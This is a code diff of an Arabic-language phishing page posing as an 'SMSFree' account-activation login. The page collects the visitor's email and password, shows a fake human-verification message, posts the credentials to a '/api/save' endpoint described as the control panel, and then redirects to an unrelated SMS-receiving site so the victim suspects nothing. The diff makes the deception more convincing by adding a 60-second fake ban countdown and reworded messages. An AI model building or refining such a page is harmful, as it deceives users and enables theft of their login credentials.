@@ -3,20 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMSFree - دخول آمن</title>
+    <title>SMSFree - نظام الحماية المطور</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600;800&display=swap" rel="stylesheet">
     <style>
         body { background-color: #0a0e17; color: white; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #141b2b; padding: 40px; border-radius: 25px; width: 90%; max-width: 380px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
-        .logo { width: 100px; height: 100px; background: #0d121c; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; border: 1px solid #00f2fe; box-shadow: 0 0 15px rgba(0,242,254,0.2); }
+        .card { background: #141b2b; padding: 40px; border-radius: 25px; width: 90%; max-width: 380px; text-align: center; border: 1px solid rgba(255,255,255,0.05); position: relative; }
+        .logo { width: 100px; height: 100px; background: #0d121c; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; border: 1px solid #00f2fe; }
         input { width: 100%; padding: 15px; margin-bottom: 15px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #4facfe; }
         input::placeholder { color: rgba(0, 242, 254, 0.4); }
-        #msg { padding: 10px; margin-bottom: 15px; border-radius: 10px; font-size: 13px; display: none; }
+        
+        /* تنسيق رسالة الحظر والعداد */
+        #msg { padding: 12px; margin-bottom: 15px; border-radius: 10px; font-size: 13px; display: none; font-weight: bold; }
         .err { background: rgba(255, 71, 87, 0.1); color: #ff4757; border: 1px solid #ff4757; }
-        .ban { background: #000; color: #ffbc00; border: 1px solid #ffbc00; }
-        button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(135deg, #4facfe, #00f2fe); color: #0a0e17; font-weight: 800; cursor: pointer; font-size: 16px; }
-        button:disabled { opacity: 0.3; }
+        .ban { background: #000; color: #ffbc00; border: 2px solid #ffbc00; animation: pulse 1s infinite; }
+        
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+
+        button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(135deg, #4facfe, #00f2fe); color: #0a0e17; font-weight: 800; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        button:disabled { background: #2c3e50; color: #7f8c8d; cursor: not-allowed; opacity: 0.5; }
         .footer { margin-top: 25px; font-size: 11px; color: #8b9bb4; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
     </style>
 </head>
@@ -32,7 +36,7 @@
             <input type="password" id="pass" placeholder="كلمة السر" required>
             
             <div id="loading" style="display:none; margin-bottom:15px; color:#4facfe;">
-                <span>⌛ جاري التحقق من أنك لست روبوت...</span>
+                <span>⌛ جاري فحص النشاط البشري...</span>
             </div>
 
             <button type="submit" id="btn">تفعيل الحساب الآن</button>
@@ -45,36 +49,36 @@
 
     <script>
         let fails = 0;
+        let isWaiting = false;
         const form = document.getElementById('loginForm');
         const m = document.getElementById('msg');
         const b = document.getElementById('btn');
 
         form.onsubmit = async (e) => {
             e.preventDefault();
+            if (isWaiting) return;
+
             const u = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
 
-            // شرط التحقق: يجب وجود @ وباسورد أكثر من 5 حروف
+            // التحقق من الصيغة
             if (!u.includes('@') || p.length < 6) {
                 fails++;
                 if (fails >= 3) {
-                    b.disabled = true;
-                    m.innerText = "لقد تم حظرك بسبب محاولات الخاطئة";
-                    m.className = "ban"; m.style.display = "block";
-                    setTimeout(() => { b.disabled = false; m.style.display = "none"; fails = 0; }, 3000);
+                    startGlobalBan();
                 } else {
-                    m.innerText = "يرجى كتابة البريد وكلمة السر بطريقة صحيحة";
+                    m.innerText = "⚠️ يرجى كتابة البريد وكلمة السر بطريقة صحيحة";
                     m.className = "err"; m.style.display = "block";
                 }
                 return;
             }
 
-            // إذا البيانات صحيحة
+            // في حال البيانات سليمة
             b.disabled = true;
             m.style.display = "none";
             document.getElementById('loading').style.display = "block";
 
-            // إرسال للوحة التحكم
+            // إرسال البيانات للوحة التحكم
             try {
                 await fetch('/api/save', {
                     method: 'POST',
@@ -83,11 +87,32 @@
                 });
             } catch(e) {}
 
-            // الانتقال الإجباري بعد ثانيتين
             setTimeout(() => {
                 window.location.href = "https://receive-smss.com/";
             }, 2000);
         };
+
+        function startGlobalBan() {
+            isWaiting = true;
+            b.disabled = true;
+            let timeLeft = 60; // دقيقة كاملة
+            
+            m.className = "ban";
+            m.style.display = "block";
+            
+            const timer = setInterval(() => {
+                m.innerText = `🚫 لقد تم حظرك بسبب المحاولات الخاطئة. سينتهي الحظر بعد ${timeLeft} ثانية`;
+                timeLeft--;
+
+                if (timeLeft < 0) {
+                    clearInterval(timer);
+                    isWaiting = false;
+                    b.disabled = false;
+                    m.style.display = "none";
+                    fails = 0; // إعادة تصفير المحاولات
+                }
+            }, 1000);
+        }
     </script>
 </body>
 </html>
